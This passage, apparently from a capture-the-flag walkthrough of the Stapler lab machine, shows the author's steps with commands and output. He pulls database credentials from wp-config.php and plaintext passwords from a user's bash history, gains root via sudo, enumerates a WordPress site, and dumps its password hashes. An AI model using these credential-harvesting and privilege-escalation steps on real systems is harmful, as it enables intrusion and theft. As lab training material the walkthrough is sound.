</span><span class='line'>(Not all processes could be identified, non-owned process info
</span><span class='line'> will not be shown, you would have to be root to see it all.)
</span><span class='line'>udp        0      0 0.0.0.0:69              0.0.0.0:*                           -               
</span><span class='line'>unix  2      [ ACC ]     STREAM     LISTENING     16924    -                   /var/run/samba/nmbd/unexpected</span></code></pre></td></tr></table></div></figure>


<p>I made a note of this and continued looking. In the Wordpress files I found the MySQL credentials inside the <code>wp-config.php</code> file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/** The name of the database for WordPress */
</span><span class='line'>define('DB_NAME', 'wordpress');
</span><span class='line'>
</span><span class='line'>/** MySQL database username */
</span><span class='line'>define('DB_USER', 'root');
</span><span class='line'>
</span><span class='line'>/** MySQL database password */
</span><span class='line'>define('DB_PASSWORD', 'plbkac');
</span><span class='line'>
</span><span class='line'>/** MySQL hostname */
</span><span class='line'>define('DB_HOST', 'localhost');</span></code></pre></td></tr></table></div></figure>


<p>On this system there are loads of home directories:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls /home
</span><span class='line'>AParnell  DSwanger    IChadwick  JKanode  LSolum2  NATHAN      SHAY       www
</span><span class='line'>CCeaser   Eeth        jamie      JLipps   MBassin  peter       SHayslett  zoe
</span><span class='line'>CJoo      elly        JBare      kai      mel      RNunemaker  SStroud
</span><span class='line'>Drew      ETollefson  jess       LSolum   MFrei    Sam         Taylor</span></code></pre></td></tr></table></div></figure>


<p>I was able to list the contents of the home folders and one of them stood out:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -alh -R /home
</span><span class='line'>/home/peter:
</span><span class='line'>total 72K
</span><span class='line'>drwxr-xr-x  3 peter peter 4.0K Jun  3  2016 .
</span><span class='line'>drwxr-xr-x 32 root  root  4.0K Jun  4  2016 ..
</span><span class='line'>-rw-------  1 peter peter    1 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 peter peter  220 Jun  3  2016 .bash_logout
</span><span class='line'>-rw-r--r--  1 peter peter 3.7K Jun  3  2016 .bashrc
</span><span class='line'>drwx------  2 peter peter 4.0K Jun  6  2016 .cache
</span><span class='line'>-rw-r--r--  1 peter peter  675 Jun  3  2016 .profile
</span><span class='line'>-rw-r--r--  1 peter peter    0 Jun  3  2016 .sudo_as_admin_successful
</span><span class='line'>-rw-------  1 peter peter  577 Jun  3  2016 .viminfo
</span><span class='line'>-rw-rw-r--  1 peter peter  39K Jun  3  2016 .zcompdump
</span><span class='line'>ls: cannot open directory '/home/peter/.cache': Permission denied</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s interesting, but there&rsquo;s nothing in that file. I&rsquo;ve looked randomly in the <em>.bash_history</em> of some users and saw there were 1-2 lines of irrelevant commands like exit, top. I decided to list all the history files and see if there are discrepancies in their size:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SHayslett@red:~$ ls -alh -R /home | grep '.bash_history'
</span><span class='line'>-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root    root      10 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root     root        5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root       root          5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root  root    16 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root  root     5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 JKanode JKanode  167 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root   root     10 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root   root      5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root    root      12 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root    root       5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root  root     5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root   root      5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-------  1 peter peter    1 Jun  5  2016 .bash_history
</span><span class='line'>ls: cannot open directory '/home/peter/.cache': Permission denied
</span><span class='line'>-rw-r--r--  1 root       root          5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root      root         5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root    root       5 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root   root      8 Jun  5  2016 .bash_history
</span><span class='line'>-rw-r--r--  1 root root    9 Jun  5  2016 .bash_history</span></code></pre></td></tr></table></div></figure>


<p>Woot, JKanode&rsquo;s history is 167 bytes long!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SHayslett@red:~$ cat /home/JKanode/.bash_history 
</span><span class='line'>id
</span><span class='line'>whoami
</span><span class='line'>ls -lah
</span><span class='line'>pwd
</span><span class='line'>ps aux
</span><span class='line'>sshpass -p thisimypassword ssh JKanode@localhost
</span><span class='line'>apt-get install sshpass
</span><span class='line'>sshpass -p JZQuyIN5 peter@localhost
</span><span class='line'>ps -ef
</span><span class='line'>top
</span><span class='line'>kill -9 3747
</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>


<p>Inside we have JKanode and peter&rsquo;s passwords! I SSH&#8217;ed as peter and checked the sudo rights:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>red% whoami
</span><span class='line'>peter
</span><span class='line'>red% sudo -l
</span><span class='line'>
</span><span class='line'>We trust you have received the usual lecture from the local System
</span><span class='line'>Administrator. It usually boils down to these three things:
</span><span class='line'>
</span><span class='line'>    #1) Respect the privacy of others.
</span><span class='line'>    #2) Think before you type.
</span><span class='line'>    #3) With great power comes great responsibility.
</span><span class='line'>
</span><span class='line'>[sudo] password for peter: 
</span><span class='line'>Matching Defaults entries for peter on red:
</span><span class='line'>    lecture=always, env_reset, mail_badpass,
</span><span class='line'>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span><span class='line'>
</span><span class='line'>User peter may run the following commands on red:
</span><span class='line'>    (ALL : ALL) ALL</span></code></pre></td></tr></table></div></figure>


<p>User peter has unlimited access on the machine! We can become root now:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>red% sudo su
</span><span class='line'>➜  peter ls /root
</span><span class='line'>fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
</span><span class='line'>➜  peter cat /root/flag.txt 
</span><span class='line'>~~~~~~~~~~&lt;(Congratulations)&gt;~~~~~~~~~~
</span><span class='line'>                          .-'''''-.
</span><span class='line'>                          |'-----'|
</span><span class='line'>                          |-.....-|
</span><span class='line'>                          |       |
</span><span class='line'>                          |       |
</span><span class='line'>         _,._             |       |
</span><span class='line'>    __.o`   o`"-.         |       |
</span><span class='line'> .-O o `"-.o   O )_,._    |       |
</span><span class='line'>( o   O  o )--.-"`O   o"-.`'-----'`
</span><span class='line'> '--------'  (   o  O    o)  
</span><span class='line'>              `----------`
</span><span class='line'>b6b545dc11b7a270f4bad23432190c75162c4a2b
</span></code></pre></td></tr></table></div></figure>


<h2>Web server on port 12380</h2>

<p>We&rsquo;ve accomplished the objective, but this is not over! Remember, there are multiple ways of getting shells.</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/stapler/stapler-site.png" title="stapler" alt="webpage"></p>

<p>A hastily built website and left unfinished is bound to have something..maybe in the source code?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! --&gt;
</span><span class='line'>&lt;!--    Change the image source '/images/default.jpg' with your favourite image.     --&gt;</span></code></pre></td></tr></table></div></figure>


<p>Hmm, let&rsquo;s probe further:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nikto -h 192.168.217.141:12380
</span><span class='line'>- Nikto v2.1.6
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Target IP:          192.168.217.141
</span><span class='line'>+ Target Hostname:    192.168.217.141
</span><span class='line'>+ Target Port:        12380
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
</span><span class='line'>                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
</span><span class='line'>                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
</span><span class='line'>+ Start Time:         2018-06-01 06:46:45 (GMT-4)
</span><span class='line'>---------------------------------------------------------------------------
</span><span class='line'>+ Server: Apache/2.4.18 (Ubuntu)
</span><span class='line'>+ Server leaks inodes via ETags, header found with file /, fields: 0x15 0x5347c53a972d1 
</span><span class='line'>+ The anti-clickjacking X-Frame-Options header is not present.
</span><span class='line'>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
</span><span class='line'>+ Uncommon header 'dave' found, with contents: Soemthing doesn't look right here
</span><span class='line'>+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
</span><span class='line'>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
</span><span class='line'>+ No CGI Directories found (use '-C all' to force check all possible dirs)
</span><span class='line'>+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
</span><span class='line'>+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
</span><span class='line'>+ "robots.txt" contains 2 entries which should be manually viewed.
</span><span class='line'>+ Hostname '192.168.217.141' does not match certificate's names: Red.Initech
</span><span class='line'>+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
</span><span class='line'>+ Uncommon header 'x-ob_mode' found, with contents: 1
</span><span class='line'>+ OSVDB-3233: /icons/README: Apache default file found.
</span><span class='line'>+ /phpmyadmin/: phpMyAdmin directory found</span></code></pre></td></tr></table></div></figure>


<p>So this site uses the database and we have robots.txt entries. However, I kept getting redirected to the webpage when trying anything else. Then I realized that I haven&rsquo;t tried browsing the site over SSL, so I did that and found myself looking at a blank page with the text <code>Internal Index Page!</code>. This time I was able to look at robots.txt and visit the entries:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/stapler/beef.jpg" title="admin" alt="admin"></p>

<p>Ok, a troll. The other entry proved more interesting, because it took me to a Wordpress blog:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/stapler/initech.png" title="initech" alt="initech blog"></p>

<p>The blog entries mention new plugins and themes..and this being a Wordpress installation, it&rsquo;s time to bring wpscan on the scene!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --disable-tls-checks --url https://192.168.217.141:12380/blogblog/
</span><span class='line'>_______________________________________________________________
</span><span class='line'>        __          _______   _____                  
</span><span class='line'>        \ \        / /  __ \ / ____|                 
</span><span class='line'>         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
</span><span class='line'>          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
</span><span class='line'>           \  /\  /  | |     ____) | (__| (_| | | | |
</span><span class='line'>            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
</span><span class='line'>
</span><span class='line'>        WordPress Security Scanner by the WPScan Team 
</span><span class='line'>                       Version 2.9.3
</span><span class='line'>          Sponsored by Sucuri - https://sucuri.net
</span><span class='line'>   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
</span><span class='line'>_______________________________________________________________
</span><span class='line'>
</span><span class='line'>[+] URL: https://192.168.217.141:12380/blogblog/
</span><span class='line'>[+] Started: Fri Jun  1 07:28:02 2018
</span><span class='line'>
</span><span class='line'>[!] The WordPress 'https://192.168.217.141:12380/blogblog/readme.html' file exists exposing a version number
</span><span class='line'>[+] Interesting header: DAVE: Soemthing doesn't look right here
</span><span class='line'>[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
</span><span class='line'>[!] Registration is enabled: https://192.168.217.141:12380/blogblog/wp-login.php?action=register
</span><span class='line'>[+] XML-RPC Interface available under: https://192.168.217.141:12380/blogblog/xmlrpc.php
</span><span class='line'>[!] Upload directory has directory listing enabled: https://192.168.217.141:12380/blogblog/wp-content/uploads/
</span><span class='line'>[!] Includes directory has directory listing enabled: https://192.168.217.141:12380/blogblog/wp-includes/
</span><span class='line'>
</span><span class='line'>[+] WordPress version 4.2.1 (Released on 2015-04-27) identified from readme, links opml, stylesheets numbers, advanced fingerprinting, meta generator
</span><span class='line'>[!] 54 vulnerabilities identified from the version number</span></code></pre></td></tr></table></div></figure>


<p>Lots of XSS and other vulnerabilities, but I didn&rsquo;t notice something that I could use immediately, like an arbitrary file upload or code execution. I went ahead and enumerated the users:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --disable-tls-checks --url https://192.168.217.141:12380/blogblog/ --enumerate u
</span><span class='line'>[+] Enumerating usernames ...
</span><span class='line'>[+] Identified the following 10 user/s:
</span><span class='line'>    +----+---------+-----------------+
</span><span class='line'>    | Id | Login   | Name            |
</span><span class='line'>    +----+---------+-----------------+
</span><span class='line'>    | 1  | john    | John Smith      |
</span><span class='line'>    | 2  | elly    | Elly Jones      |
</span><span class='line'>    | 3  | peter   | Peter Parker    |
</span><span class='line'>    | 4  | barry   | Barry Atkins    |
</span><span class='line'>    | 5  | heather | Heather Neville |
</span><span class='line'>    | 6  | garry   | garry           |
</span><span class='line'>    | 7  | harry   | harry           |
</span><span class='line'>    | 8  | scott   | scott           |
</span><span class='line'>    | 9  | kathy   | kathy           |
</span><span class='line'>    | 10 | tim     | tim             |
</span><span class='line'>    +----+---------+-----------------+</span></code></pre></td></tr></table></div></figure>


<p>Next I enumerated all the plugins in the hope of finding an exploitable vulnerability:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wpscan --disable-tls-checks --url https://192.168.217.141:12380/blogblog/ --enumerate ap
</span><span class='line'>[+] Enumerating all plugins (may take a while and use a lot of system resources) ...
</span><span class='line'>
</span><span class='line'>   Time: 00:04:40 &lt;=====================&gt; (74652 / 74652) 100.00% Time: 00:04:40
</span><span class='line'>
</span><span class='line'>[+] We found 4 plugins:
</span><span class='line'>
</span><span class='line'>[+] Name: advanced-video-embed-embed-videos-or-playlists - v1.0
</span><span class='line'> |  Latest version: 1.0 (up to date)
</span><span class='line'> |  Last updated: 2015-10-14T13:52:00.000Z
</span><span class='line'> |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
</span><span class='line'> |  Readme: https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt
</span><span class='line'>[!] Directory listing is enabled: https://192.168.217.141:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
</span><span class='line'>
</span><span class='line'>[+] Name: akismet
</span><span class='line'> |  Latest version: 4.0.7 
</span><span class='line'> |  Last updated: 2018-05-28T16:19:00.000Z
</span><span class='line'> |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/akismet/
</span><span class='line'>
</span><span class='line'>[!] We could not determine a version so all vulnerabilities are printed out
</span><span class='line'>
</span><span class='line'>[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
</span><span class='line'>    Reference: https://wpvulndb.com/vulnerabilities/8215
</span><span class='line'>    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
</span><span class='line'>    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
</span><span class='line'>[i] Fixed in: 3.1.5
</span><span class='line'>
</span><span class='line'>[+] Name: shortcode-ui - v0.6.2
</span><span class='line'> |  Last updated: 2017-09-12T20:55:00.000Z
</span><span class='line'> |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/
</span><span class='line'> |  Readme: https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt
</span><span class='line'>[!] The version is out of date, the latest version is 0.7.3
</span><span class='line'>[!] Directory listing is enabled: https://192.168.217.141:12380/blogblog/wp-content/plugins/shortcode-ui/
</span><span class='line'>
</span><span class='line'>[+] Name: two-factor
</span><span class='line'> |  Latest version: 0.1-dev-20180225 
</span><span class='line'> |  Last updated: 2018-02-25T10:55:00.000Z
</span><span class='line'> |  Location: https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/
</span><span class='line'> |  Readme: https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/readme.txt
</span><span class='line'>[!] Directory listing is enabled: https://192.168.217.141:12380/blogblog/wp-content/plugins/two-factor/</span></code></pre></td></tr></table></div></figure>


<p>Still not much. The expected way is to upload a reverse shell, but I didn&rsquo;t have credentials for the WP users and I tried bruteforcing but it was very slow. I remembered that I have the MySQL credentials from earlier:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# mysql -u root -h 192.168.217.141 wordpress -p
</span><span class='line'>Enter password: 
</span><span class='line'>Reading table information for completion of table and column names
</span><span class='line'>You can turn off this feature to get a quicker startup with -A
</span><span class='line'>
</span><span class='line'>Welcome to the MariaDB monitor.  Commands end with ; or \g.
</span><span class='line'>Your MySQL connection id is 21183
</span><span class='line'>Server version: 5.7.12-0ubuntu1 (Ubuntu)
</span><span class='line'>
</span><span class='line'>Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.
</span><span class='line'>
</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
</span><span class='line'>
</span><span class='line'>MySQL [wordpress]&gt; </span></code></pre></td></tr></table></div></figure>


<p>I logged in to the DB and grabbed the password hashes:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>MySQL [wordpress]&gt; show tables;
</span><span class='line'>+-----------------------+
</span><span class='line'>| Tables_in_wordpress   |
</span><span class='line'>+-----------------------+
</span><span class='line'>| wp_commentmeta        |
</span><span class='line'>| wp_comments           |
</span><span class='line'>| wp_links              |
</span><span class='line'>| wp_options            |
</span><span class='line'>| wp_postmeta           |
</span><span class='line'>| wp_posts              |
</span><span class='line'>| wp_term_relationships |
</span><span class='line'>| wp_term_taxonomy      |
</span><span class='line'>| wp_terms              |
</span><span class='line'>| wp_usermeta           |
</span><span class='line'>| wp_users              |
</span><span class='line'>+-----------------------+
</span><span class='line'>
</span><span class='line'>MySQL [wordpress]&gt; SELECT user_login, user_pass FROM wp_users;
</span><span class='line'>+------------+------------------------------------+
</span><span class='line'>| user_login | user_pass                          |
</span><span class='line'>+------------+------------------------------------+
</span><span class='line'>| John       | $P$B7889EMq/erHIuZapMB8GEizebcIy9. |
</span><span class='line'>| Elly       | $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0 |
</span><span class='line'>| Peter      | $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0 |
</span><span class='line'>| barry      | $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0 |
</span><span class='line'>| heather    | $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10 |
</span><span class='line'>| garry      | $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1 |
</span><span class='line'>| harry      | $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0 |
</span><span class='line'>| scott      | $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1 |
</span><span class='line'>| kathy      | $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0 |
</span><span class='line'>| tim        | $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0 |
</span><span class='line'>| ZOE        | $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1 |
</span><span class='line'>| Dave       | $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy. |
</span><span class='line'>| Simon      | $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0 |
</span><span class='line'>| Abby       | $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs. |
</span><span class='line'>| Vicki      | $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131 |
</span><span class='line'>| Pam        | $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0 |
